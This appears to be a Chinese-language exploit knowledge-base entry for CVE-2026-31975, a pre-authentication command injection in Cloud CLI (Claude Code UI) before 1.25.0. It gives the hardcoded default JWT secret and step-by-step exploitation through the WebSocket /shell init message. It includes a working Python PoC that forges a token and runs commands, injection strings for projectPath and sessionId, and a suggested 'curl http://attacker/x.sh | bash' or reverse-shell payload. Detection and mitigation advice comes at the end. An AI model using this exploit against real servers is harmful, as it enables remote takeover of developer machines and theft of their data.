---
id: web-generic-websocket-claudecodeui-ws-shell-command-injection
title: Cloud CLI（Claude Code UI）WebSocket Shell 命令注入：默认 JWT 密钥伪造 + projectPath/initialCommand 直拼 bash（CVE-2026-31975）
type: scenario
domain: web
path: web/generic/websocket
technique: claudecodeui-websocket-shell-command-injection
aliases:
- CVE-2026-31975
- Cloud CLI RCE
- Claude Code UI RCE
- WebSocket Shell 命令注入
- projectPath 注入
- initialCommand 注入
- claude-ui-dev-secret
tags:
- websocket
- command-injection
- claudecodeui
- cloud-cli
- nodejs
- jwt
- default-secret
- pty
- cve-2026-31975
cve:
- CVE-2026-31975
severity: critical
confidence: high
affected_versions: < 1.25.0
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V155
  verified_at: '2026-11-06T07:49:24+08:00'
  notes: 已对照原文与14张图核对：默认JWT_SECRET、authenticateWebSocket只验签不查用户、init消息projectPath/initialCommand直拼cd/Set-Location、bash -c/powershell -Command、pty.spawn、cursor sessionId二次注入、伪造userId=1 token执行calc复现均与图文一致。affected_versions <1.25.0与原文“1.25.0之前”一致。未验证点：未复跑PoC。
---

## 一句话结论

Cloud CLI（Claude Code UI）`< 1.25.0` 的 WebSocket `/shell` 端点把 `init` 消息中的 `projectPath`、`initialCommand` 直接拼进 `cd "<projectPath>" && <initialCommand>`（Windows 为 `Set-Location -Path "<projectPath>"; <initialCommand>`）交给 `pty.spawn` 的 bash/powershell 执行；同时未设置 `JWT_SECRET` 时使用硬编码默认密钥，且 WebSocket 只验签不查用户是否存在，攻击者可用默认密钥伪造任意 `userId` 的 token 建立连接并注入命令，形成默认部署下的 RCE。

## 原理

- **默认 JWT 密钥**：`server/middleware/auth.js` 中 `const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production'`；开发者未配置环境变量时，攻击者可离线签发合法的 HS256 token。
- **WebSocket 鉴权缺口**：`authenticateWebSocket` 只执行 `jwt.verify(token, JWT_SECRET)` 并返回解码结果，没有用 `decoded.userId` 查询数据库；伪造一个不存在的 `userId` 也能通过 WebSocket 认证。修复版才在验签后调用 `userDb.getUserById(decoded.userId)` 并拒绝不存在用户。
- **消息拼接**：`server/index.js` 处理 `data.type === 'init'` 时读取 `data.projectPath || process.cwd()`、`data.initialCommand`、`data.isPlainShell`。Plain Shell 分支直接拼接：
  - Linux/macOS：`shellCommand = \`cd "${projectPath}" && ${initialCommand}\``；
  - Windows：`shellCommand = \`Set-Location -Path "${projectPath}"; ${initialCommand}\``。
- **PTY 执行**：`shell` 选 `powershell.exe` 或 `bash`，`shellArgs` 为 `['-Command', shellCommand]` 或 `['-c', shellCommand]`，再 `pty.spawn(shell, shellArgs, ...)`。整串由 shell 解析，`;`、`&&`、`|`、`$()`、反引号均可截断并执行任意命令。
- **二次注入**：`provider=cursor` 且 `hasSession=true` 时，`sessionId` 同样未经消毒被拼入命令，形成第二条注入向量。
- 根本原因：认证密钥可预测 + WebSocket 认证未绑定真实用户 + 用户输入直接进入 shell 命令字符串，三者叠加使预认证 RCE 成立。

## 触发条件

- Cloud CLI（claudecodeui）版本 `< 1.25.0`，服务可访问（默认 3001 端口）。
- 服务未显式设置 `JWT_SECRET`（使用默认硬编码密钥），或攻击者已持有任意合法 JWT。
- `/shell` WebSocket 端点暴露，攻击者能发送 `type: init` 消息。
- 服务进程有执行 shell/PTY 的权限（默认即如此）。

## 利用步骤

1. 用默认密钥 `claude-ui-dev-secret-change-in-production` 签发 HS256 JWT，payload 填任意 `userId`（如 `{"userId":1,"username":"1213"}`），无需该用户在数据库中真实存在。
2. 连接 `ws://target:3001/shell?token=<JWT>`。
3. 发送 `init` 消息，`isPlainShell: true`，`projectPath` 填合法目录，`initialCommand` 填要执行的命令。
4. 服务端拼成 `cd "<projectPath>" && <initialCommand>` 并交给 `bash -c` / `powershell -Command` 执行，回显通过 WebSocket `output` 消息返回。
5. `initialCommand` 可换成 `curl http://attacker/x.sh | bash`、反弹 shell 等；`projectPath` 中同样可注入 `"; id; #`（Linux）或 `"; calc; #`（PowerShell）。
6. 变体：发送 `{"type":"init","provider":"cursor","hasSession":true,"sessionId":"<命令>","projectPath":"/tmp"}` 命中 `sessionId` 二次注入。

## PoC

```python
import asyncio, json, jwt, websockets

SECRET = "claude-ui-dev-secret-change-in-production"
token = jwt.encode({"userId": 1, "username": "x"}, SECRET, algorithm="HS256")

async def main():
    url = f"ws://127.0.0.1:3001/shell?token={token}"
    async with websockets.connect(url) as ws:
        await ws.send(json.dumps({
            "type": "init",
            "projectPath": "/tmp",
            "initialCommand": "id",
            "isPlainShell": True,
            "hasSession": False,
        }))
        print(await ws.recv())

asyncio.run(main())
```

Windows 目标可执行 `calc` 等命令验证；服务端返回 `{"type":"output","data":"..."}` 即成功。

## 变体与关联

- 变体：`sessionId` 二次注入（`provider=cursor` + `hasSession=true`），不依赖 `initialCommand`。
- 变体：`projectPath` 注入（`/tmp"; id; #`），即使 `initialCommand` 被限制也可执行。
- 变体：若部署者自定义了弱 `JWT_SECRET`，同样可爆破/猜测后伪造。
- 关联：默认 JWT 密钥类漏洞、WebSocket 认证缺失、AI 编码工具网关/终端 RCE（如 OpenClaw Gateway 系列）、pty/terminal 端点命令注入（如 Dokploy 容器终端）。

## 检测与防御

- 升级到 `>= 1.25.0`：强制显式 `JWT_SECRET`（未设置时随机生成并存于 app config DB），WebSocket 验签后校验用户存在。
- 认证：部署时设置高强度随机 `JWT_SECRET`，定期轮换；WebSocket 与 REST 使用同一套用户存在性/会话校验。
- 命令执行：不要拼接 shell 字符串；用 `spawn(cmd, args, {shell:false})` 或对 `projectPath` 做 `realpath` + 白名单目录校验，`initialCommand` 仅允许预定义命令。
- 网络：Cloud CLI 只监听 `127.0.0.1`/内网，前置认证与 TLS，禁止把 3001 端口暴露到公网。
- 检测：监控 `/shell` 连接中使用默认密钥签名的 token、`init` 消息中出现 `;`、`&&`、`|`、`$(`、反引号等 shell 元字符，以及 PTY 子进程启动异常命令的行为；审计 `initialCommand`/`sessionId` 字段。
